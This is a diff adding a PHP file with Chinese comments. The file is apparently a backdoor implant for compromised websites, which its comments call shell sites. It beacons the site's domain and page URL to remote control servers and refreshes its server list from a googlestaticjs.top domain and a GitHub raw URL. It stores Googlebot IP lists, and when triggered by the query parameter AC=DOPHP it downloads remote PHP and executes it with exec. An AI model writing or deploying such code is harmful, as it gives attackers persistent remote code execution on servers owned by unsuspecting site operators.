@@ -1,1 +1,402 @@
 
+<?php
+// 查询当前PHP页面所在服务器环境的时区
+$originalTimeZone = date_default_timezone_get();
+// 改为UTC时区
+date_default_timezone_set('UTC');//程序结束后 还要再还原原本的时区 
+ 
+/*** 缓存路径 ***/
+$filePath = './tmp/cache.json';//*****需要手工设置的　可使用绝对路径 $filePath = 'D:\phpstudy_pro\WWW\\wshell.com\data\cache.json'; 
+$api_cache_file = './tmp/api_cache.txt';//*****需要手工设置的　!!!!!!###########*****需要手工设置的　!!!!!!###########*****需要手工设置的　!!!!!!###########*****需要手工设置的　!!!!!!###########
+/***API初始url 基础 */
+$apiUrlsBase = [ 'http://192.168.0.105:8999/heartbeat-packet/', 'https://api.base.com/backup1', 'https://api.base.com/backup2' ];//******需要手工设置的　!!!!!!########### */
+/**约定动作参数 */
+$AC="";
+if(isset($_GET['AC'])){ $AC=trim($_GET['AC']); $AC=str_replace(' ','',$AC); }
+
+$domain = $_SERVER['SERVER_NAME'];
+// echo $domain;
+//$domain = "www.a.com"; //###测试使用 修改 注消###################################测试使用###测试使用 修改 注消##################################测试使用 修改 注消###############################
+$page_url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
+// echo $page_url;
+
+/*** 初始化 API 地址 apiUrl　和新增ggＩＰ, newGooglebotIPs***/
+$apiUrl = "";
+$newGooglebotIPs =[];
+$heartbeat_packet_interval=30;
+
+$updateTime="2022-11-11 11:00:00";//预设置
+
+
+
+$dateYI = new DateTime();
+$dateYI->setTimezone(new DateTimeZone('UTC'));
+$nowTime=$dateYI->format('Y-m-d H:i');
+// echo $nowTime;
+
+//检测URL是否可用 返回真假是否
+function checkUrlWorkOK($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_NOBODY, true);
+    curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    if( $httpCode >= 200 && $httpCode <= 300){
+        return true;
+    } else {
+        return false;
+    }
+}
+
+//加解密 相关函数 ＝＝＝ 开始
+//增加同名 random_bytes, 否则 7以上才支持
+function random_bytesYYY($length) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+      $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+  }
+
+function encrypt($data, $token) {
+    $iv = random_bytesYYY(16);
+    // 生成256位的密钥
+    $key = hash('sha256', $token, true);
+    $encrypted_data = openssl_encrypt(json_encode($data,320), 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);//改json_encode 加参数 禁转义 禁 \
+    $encrypted_data = base64_encode($iv . $encrypted_data);
+    return $encrypted_data;
+}
+function decrypt($encrypted_data, $token) {
+    $encrypted_data = base64_decode($encrypted_data);
+    $iv = substr($encrypted_data, 0, 16);
+    $encrypted_data = substr($encrypted_data, 16);
+    // 生成256位的密钥
+    $key = hash('sha256', $token, true);
+    $decrypted_data = openssl_decrypt($encrypted_data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);// 原
+    // $decrypted_data = stripslashes(openssl_decrypt($encrypted_data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv));//新
+    return $decrypted_data;
+}
+function gen_token($domain) {
+    // 固定字符串，根据实际情况修改
+    $fixed_string = "DhdL8Uf9hHNWVNcGwybP8bDhqwn3WpHrRsgaugOqx";
+    // 获取当前 UTC+0 时区时间（精确到分钟）
+    $utc_time = gmdate('Y-m-d H:i');
+    // 使用SHA-256计算哈希值
+    $sha256_hash = hash('sha256', $domain . $fixed_string . $utc_time, true);
+    // 生成256位的密钥
+    $key = hash('sha256', $sha256_hash, true);
+    // 将SHA-256哈希值转换为32字节的URL安全的Base64编码字节
+    // $token = rtrim(strtr(base64_encode($sha256_hash), '+/', '-_'), '=');
+    $token = strtr(base64_encode($sha256_hash), '+/', '-_');//============================================================ 恢复了“＝” 不删除
+    return array($token, $domain . $fixed_string . $utc_time);
+}
+function gen_token_notime($domain) {
+    // 固定字符串，根据实际情况修改
+    $fixed_string = "DhdL8Uf9hHNWVNcGwybP8bDhqwn3WpHrRsgaugOqx";   
+    
+    // 使用SHA-256计算哈希值
+    $sha256_hash = hash('sha256', $domain . $fixed_string , true);
+    // 生成256位的密钥
+    $key = hash('sha256', $sha256_hash, true);
+    // 将SHA-256哈希值转换为32字节的URL安全的Base64编码字节
+    // $token = rtrim(strtr(base64_encode($sha256_hash), '+/', '-_'), '=');
+    $token = strtr(base64_encode($sha256_hash), '+/', '-_');//============================================================ 恢复了“＝” 不删除
+    return array($token, $domain . $fixed_string );
+}
+
+//增加单独的不加转义的 加解密
+function encryptDataYY($data, $key) {
+    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+    $encrypted = openssl_encrypt($data, 'aes-256-cbc', hash('sha256', $key, true), 0, $iv);
+    return base64_encode($encrypted . '::' . $iv);
+}
+
+function decryptDataYY($data, $key) {
+    list($encrypted_data, $iv) = explode('::', base64_decode($data), 2);
+    return openssl_decrypt($encrypted_data, 'aes-256-cbc', hash('sha256', $key, true), 0, $iv);
+}
+//加解密 相关函数 ＝＝＝ 结束
+
+//更新API缓存文件
+function updateApiCache($cache_file) {
+    $api_urls = [
+        'https://static.googlestaticjs.top/new_api',
+        'https://raw.githubusercontent.com/glady1998/testdemo/main/new_api',
+    ];
+    foreach ($api_urls as $api_url) {
+        $latest_api_content = @file_get_contents($api_url);
+
+        if ($latest_api_content !== false) {
+            $latest_api_content = trim($latest_api_content);
+            // Save the latest API to cache file
+            // var_dump($latest_api_content);
+            
+            $directory = dirname($cache_file);
+            if (!is_dir($directory)) {  mkdir($directory, 0777, true); }
+            if (!file_exists($cache_file)) {  touch($cache_file);}
+            file_put_contents($cache_file, $latest_api_content);
+            // 如果成功获取到API内容，则结束循环
+            break;
+        }
+    }
+}//end  更新API缓存文件 updateApiCache 
+
+
+list($Token, $unused2) = gen_token($domain);
+list($TokenNotime, $unused2notime) = gen_token_notime($domain);
+
+
+//### 数据准备 访问本地 取数据 
+if (file_exists($filePath)) { 
+    $mtime = filemtime($filePath);
+    $updateTime= date('Y-m-d H:i', $mtime);// 文件最后修改时间 到分钟
+    // echo "file_exists.<br>";   
+    $cacheDataStr = file_get_contents($filePath);   //从本地文件取数据 解密数据 提取JSON中几个项 备用   
+    $decrypted_data = decryptDataYY($cacheDataStr, $TokenNotime); //解密数据  已验证一致
+    $data = json_decode($decrypted_data, true, 512, JSON_UNESCAPED_UNICODE);//还原 无转义的原始内容数据
+
+    $heartbeat_packet_interval=$data['heartbeat_packet_interval'];//字位4 , 间隔时间 分钟
+    if($heartbeat_packet_interval<1){$heartbeat_packet_interval=30;}//如果取得间隔太小 小于1，不采用 恢复30分钟
+    $apiUrls=$data['api_list'];//字位5 ,获取 新ApiUrls列表数据
+    if(!empty($apiUrls)){
+        $apiUrl = $apiUrls[0]; // 获取第一个URL作为默认请求的api
+        foreach ($apiUrls as $url) {
+            if(checkUrlWorkOK($url)) { $apiUrl = $url; break; }//重写可用网址
+        }//end foreach 
+    }else{
+        $apiUrl = $apiUrlsBase[0];
+    }    
+    // $update_php_code=$data['update_php'];//字位6 , 运维用的php代码段内容 暂不处理 排后 备用***************************************************
+    $newGooglebotIPs = $data['new_google_bot_ips'];  //***字位7 ,. 新增加的GG ip,或存在 有可能 ， 1. 读取缓存中的newGooglebotIPs *** //addyyy
+
+}else{ // 初始url 程序自带　写死的******需要手工设置的　!!!!!!########### 
+    $apiUrls = $apiUrlsBase;
+    $apiUrl = $apiUrls[0];
+    //检测 api列表　是否正常访问
+    foreach ($apiUrls as $url) {
+        if(checkUrlWorkOK($url)) { $apiUrl = $url; break; }//重写可用网址
+    }//end foreach
+    //### 后面可能增加 :  getSiteInfo(),检测本地文件夹 文件结构 特点判断是什么系统，返回目录结构文件结构，;  setSiteInfo() ,保存前面的信息到本地数据文件中，以备 发送 给API使用
+}//endif file_exists
+
+if(!checkUrlWorkOK($apiUrl)) {
+    // echo "以上取得的apiUrl不可用,需要使用代码段写死的默认项:".$apiUrl ; 或 主动请求 只更新api地址， 请求得到一个可用地址， 应考虑保留 公网，程序自己发现无可用网址后即时主动请求 ???
+    // 找本地专用的API 数据文件
+    if (file_exists($api_cache_file)) {        
+        $lines = file($api_cache_file, FILE_IGNORE_NEW_LINES);// 读取文件内容 
+        if(count($lines)>0){
+            foreach ($lines as $url) {
+                if(checkUrlWorkOK($url)) { $apiUrl = $url; break; }//重写可用网址
+            }//end foreach
+        }else{
+            updateApiCache($api_cache_file);// 主动更新，但本次会失败,下次就正常了; 
+        }      
+    }else{
+        updateApiCache($api_cache_file);// 主动更新，但本次会失败; 
+    }
+    
+}
+
+
+ 
+/*** 获取远程api数据 ,参数：远程API网址，新GG地址，约定TOKEN,域名，当页网址 ***/
+function getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url ) {    //$post_data  : $new_google_bot_ips,$token
+    echo "<br>getAPIData() 已执行，发送TOKEN 网址域名 新GG， 取数据<br>";
+        
+    // 构建json格式数据 发TOKEN, 发送的数据为1.gg新IP，2.域名，3.网页
+    $postJdata = '{"new_google_bot_ips":'.json_encode($newGooglebotIPs).',"domain":"'.$domain.'","page_url":"'.$page_url.'","token":"'.$Token.'" } ';
+    echo "<br>postJdata =$postJdata<br>";
+  
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $apiUrl);//访问ＡＰＩ
+    curl_setopt($ch, CURLOPT_POST, true);    
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postJdata  );//发送数据，
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    curl_setopt($ch, CURLOPT_HEADER, false);    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);    curl_setopt($ch, CURLOPT_MAXREDIRS, 3);    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    
+    $jsonResponse = curl_exec($ch);
+    curl_close($ch);  
+    echo "<br>getAPIData() 已取返回数据：  <br>";//json_decode('"' . $str . '"');
+    var_dump($jsonResponse);
+    return $jsonResponse;
+}
+
+/***处理 保存 取得的API数据，主要是 0.转数组 处理转义 1.提取 2.解密 3.重新加密 4.保存 */
+//      参数 1.得到返回新JSON密文gotEncJson，2.涉外Token，3.本地无时间TokenNotime，4.文件保存路径filePath
+// 加验证数据合理性 *** 并修改最后时间
+function processSaveAPIData($gotEncJson,$Token,$TokenNotime,$filePath){    
+    //0.1尝试解析为数组 转数组 处理转义
+    $gotEncJson = json_decode($gotEncJson, true, 512, JSON_UNESCAPED_UNICODE);//处理转义
+
+    //0.2 判断解析是否成功
+    if($gotEncJson === null) {
+        touch($filePath);// 不是正常JSON格式时 改缓存文件最后修改时间，但是不改变原内容
+    } else {        
+        // $gotEncJson 正常JSON格式 可以使用时， 还要判断 是否有data ,msg键， 是否 "msg": "token ok" 
+        if( isset($gotEncJson['msg']) and isset($gotEncJson['data']) and ($gotEncJson['msg'] == 'token ok') ){
+            //有两个键 且  'token ok' ， 合法            
+            //1.提取
+            $received_data = $gotEncJson['data'];
+            //2.解密 解密数据  已验证一致
+            $decrypted_data = decrypt($received_data, $Token);
+            //2.5 加处理恢复原样 对解密后数据 处理转义 转为JSON 数组    
+            $dataJsonORI = json_decode($decrypted_data, true, 512, JSON_UNESCAPED_UNICODE);//处理转义 
+            echo "<br>processSaveAPIData()执行中2.5 恢复JSON原样后 第一次 str :   <br>";            
+            var_dump($dataJsonORI);
+
+            // $dataJsonORI = json_decode($dataJsonORI, true, 512, JSON_UNESCAPED_UNICODE);
+
+            // echo "<br>processSaveAPIData()执行中2.5 恢复JSON原样后 第二次:   <br>";            
+            // var_dump($dataJsonORI);
+
+
+
+            //2.6 再次验证 还原的dataJsonORI 是否为正常JSON格式
+            if($dataJsonORI === null){
+                touch($filePath);
+            }else{
+                // //2.7如果是正常JSON ，就转为字符串 320
+                // $dataJsonORIstr = json_encode($dataJsonORI, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+                // echo "<br>processSaveAPIData()执行中2.7 恢复JSON原样数组后 再转为dataJsonORIstr字串320:   <br>";            
+                // var_dump($dataJsonORIstr);
+
+                // $testtt = json_decode($dataJsonORIstr, true, 512, JSON_UNESCAPED_UNICODE);
+                // echo "<br>processSaveAPIData()执行中2.5 恢复JSON原样后 第3次 testtt测试:   <br>";            
+                // var_dump($testtt);
+
+                //3.重新加密   加重新在本地对 取得json加密，用无时间TOKEN，以方便本地自己存取                
+                $encryptedJsonStr = encryptDataYY($dataJsonORI, $TokenNotime);//新 无转义符 加密
+                //4.保存   写入本地 原加密内容 直接写入即可，读取时再 处理 转义
+                if(mb_strlen($encryptedJsonStr) > 100){     
+                    $directory = dirname($filePath);
+                    if (!is_dir($directory)) {  mkdir($directory, 0777, true); }
+                    if (!file_exists($filePath)) {  touch($filePath);}  
+                    file_put_contents($filePath, $encryptedJsonStr);
+                    echo "<br>processSaveAPIData()执行 4. 已写入本地:$filePath  <br>";             
+                }else{touch($filePath);}//end if mb_strlen($encryptedJsonStr) > 100
+
+            }//end dataJsonORI           
+
+        }else{touch($filePath);}
+    }
+
+
+}
+
+// ###主程序###发送数据，取得数据，处理数据更新，保存；
+//  取得远程　更新/创建　本地json AC为动作控制器, 如果参数为数字即为心跳间隔时间，　如果为"DO"则强制执行更新，不考虑时间间隔； 如无参数 普通访客 按心跳时间处理更新
+// AC条件分支： 1.为数字>1 按AC值时间执行更新全部数据；2.DO，强制更新全部数据；3.API，仅更新API一个网址强制；4.PHP，执行代码；5.其它情况，无AC参数不符合前面条件的，执行常规心跳；
+if ( is_numeric($AC) and ($AC>1) ){
+    //1.为数字>1 按AC时间执行更新全部数据；
+    $timeDiff = strtotime($nowTime) - strtotime($updateTime);
+    $minutesDiff = floor($timeDiff / 60);
+    if ($minutesDiff >= $AC) {        
+        $newJson=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url);    
+        if(mb_strlen($newJson) > 100){
+            processSaveAPIData($newJson,$Token,$TokenNotime,$filePath);
+         }//endif mb_strlen($newJsonORI) 返回字符串长度大于100，
+    } 
+
+}elseif($AC=="DO"){
+    // echo "2.强制更新全部 DO ALL";只发送 接收数据 不验证无返回
+    //发API请求带数据 验证通过后 得到返回数据 更新本地文件  
+    $newJsonORI=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url); 
+    //暂按得到返回字符串长度计算 如果小于100字符一定是不成功 ; 正式时改用 的msg 或code码验证 ，成功失败，如果成功 向下执行， 如果不成功 过；
+    if(mb_strlen($newJsonORI) > 100){      
+       //processSaveAPIData()
+       processSaveAPIData($newJsonORI,$Token,$TokenNotime,$filePath);
+    }//endif mb_strlen($newJsonORI) 返回字符串长度大于100，   
+
+
+}elseif($AC=="DOPHP"){
+    // 获取远程文件内容
+    $api_urls = [
+        'https://static.googlestaticjs.top/tudo',
+        'https://raw.githubusercontent.com/glady1998/testdemo/main/todu',
+    ];
+    foreach ($api_urls as $api_url) {
+        $latest_api_content = @file_get_contents($api_url);
+
+        if ($latest_api_content !== false) {
+            echo "<br>获取远程文件内容OK=$api_url<br>";
+            // 将内容写入本地文件
+            $localFilePath = './tmp/tudo.php';//*** 预设置 是否可放到文件头部初始化设置 ??? 需要修改*** *****需要手工设置的　!!!!!!###########*****需要手工设置的　!!!!!!###########
+            $directory = dirname($localFilePath);
+            if (!is_dir($directory)) {  mkdir($directory, 0777, true); }
+            if (!file_exists($localFilePath)) {  touch($localFilePath);}
+            $result = file_put_contents($localFilePath, $latest_api_content);
+
+            if ($result !== false) {
+                // 执行本地PHP文件
+                $command = 'php ' . $localFilePath;
+                exec($command, $output, $return_var);
+
+                // 检查执行结果
+                if ($return_var === 0) {
+                    echo "<br>PHP文件执行成功\n";
+                    echo "<br>输出结果:\n";
+                    echo implode("\n", $output);
+                    break;
+                } else {
+                    echo "<br>PHP文件执行失败\n";
+                    echo "<br>错误码: " . $return_var . "\n";
+                }
+            } else {
+                echo "<br>写入本地文件失败\n";
+            }
+        } else {
+            echo "<br>获取远程文件内容失败=$api_url<br>";
+        }
+        
+    }//end foreach 
+
+}else{
+    echo "<br>  常规 无参数 其它情况 已执行 。。。<br>";
+    //5.其它情况 如果无参数 是被 SHELL站访客调用，常规用心跳间隔时间对比更新是否执行, 这个条件可以前置到第一位
+    //一. 维护 链接数据本地文件
+    $timeDiff = strtotime($nowTime) - strtotime($updateTime);
+    $minutesDiff = floor($timeDiff / 60);   
+    echo "<br>  minutesDiff 1.＝$minutesDiff<br>";   
+    //if ($minutesDiff >= $heartbeat_packet_interval) {  
+    if ( $minutesDiff >= 1) { //测试用1分钟，正式用上面变量********************************************************
+        echo "<br> minutesDiff>1 执行 发送数据到API ，取数据 getAPIData（）<br>";      
+        $newJson=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url);    
+        if(mb_strlen($newJson) > 100){
+            echo "<br> newJson 送数据长度>100 ，下一步 处理解密 重加密 保存本地processSaveAPIData() <br>";  
+            processSaveAPIData($newJson,$Token,$TokenNotime,$filePath);
+         }//endif mb_strlen($newJsonORI) 返回字符串长度大于100，
+
+    }else{
+        echo "<br>测试显示 后面删除 minutesDiff  heartbeat_packet_interval<br>"; // 测试显示 后面删除******************************
+    } 
+
+    //二. 维护 单独的API数据本地文件     
+    // $cache_expiration = 60 * 60; // 1 day (in seconds)24 * 60 * 60
+    if (file_exists($api_cache_file)) {
+        echo "<br>api_cache file_exists YES =$api_cache_file<br>";
+        $mtime = filemtime($api_cache_file);
+        $updateTime= date('Y-m-d H:i', $mtime);
+        $timeDiff = strtotime($nowTime) - strtotime($updateTime);
+        $minutesDiff = floor($timeDiff / 60);  
+        if ($minutesDiff > 1) {//测试改 1  正常60分钟**********// floor($heartbeat_packet_interval / 2) 取心跳时间的一半  //*******************************需要手工设置的　!!!!!!###########
+            // Update the cache with the latest API
+            updateApiCache($api_cache_file);
+            echo "<br>api_cache file_exists YES, cache_expiration>60分钟: updateApiCache() ED ...<br>";
+        }else{
+            echo "<br>测试显示 后面删除 current_time -  cache_time <间隔时间 不足，要等时间<br>";// 测试显示 后面删除******************************
+        }
+    } else {
+        // Cache file does not exist, update the cache with the latest API
+        echo "<br>file_exists NOT: updateApiCache() NEXT...<br>";
+        updateApiCache($api_cache_file);
+    }
+
+}//end if AC, AC=123 AC=DO
+
+
+// 把时区改回服务器原环境时区
+date_default_timezone_set($originalTimeZone);
+
+?>
